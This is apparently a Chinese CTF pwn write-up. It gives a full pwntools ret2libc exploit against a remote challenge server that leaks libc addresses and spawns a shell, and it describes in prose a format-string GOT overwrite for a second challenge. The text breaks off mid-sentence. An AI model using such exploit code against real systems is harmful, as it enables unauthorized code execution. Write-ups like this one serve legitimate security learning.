# PWN
## ez_game
这周最简单的一道题，一道简单的ret2libc
![[Pasted image 20241005215022.png]]
![[Pasted image 20241005215127.png]]
![[Pasted image 20241005215110.png]]
构造exp:
```python
from pwn import *
import pwnlib.gdb

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./attachment')
    pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('101.200.139.65', 30780)

elf = ELF('./attachment')
lib = ELF('./libc-2.31.so')

ret = 0x400509
rdi = 0x400783
rsp = 0x40077d

put_got = elf.got['puts']
put_plt = elf.plt['puts']
main = elf.symbols['func']

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50) + p64(ret) + p64(rdi) + p64(put_got) + p64(put_plt) + p64(main)
p.sendline(payload)

p.recvuntil(b'again!!\n')

addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(addr))

libc_base = addr - lib.sym['puts']
system = libc_base + lib.sym['system']
binsh = libc_base + next(lib.search('/bin/sh'))

p.recvuntil(b"!!!!\n")

payload = b'A' * (0x50 + 8) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(payload)

p.interactive()
```
运行后获取`shell`
![[Pasted image 20241005215455.png]]
PS:两个payload构造的时候涉及的栈堆平衡还不是很懂，这里属于试错试出来的

## easy fmt
首先第一次遇到给ld-linux的题目，查了一下需要patchelf后把libc版本弄对
![[Pasted image 20241005215657.png]]
主要函数这里可以看出可以利用格式化字符串漏洞，用gdb调试一下
![[Pasted image 20241005215834.png]]
可以看到`canary`(这道题没用)和`__libc_start_main+128`
思路很明显，第一次，利用格式化字符串漏洞泄露`__libc_start_main`的地址后可以获取基址，从而获取system函数的地址，同时获取printf函数的got表地址；第二次，利用格式化字符串漏洞将printf函数换为system函数；第三次，输入`/bin/sh`，使printf函数实际

## Inverted World
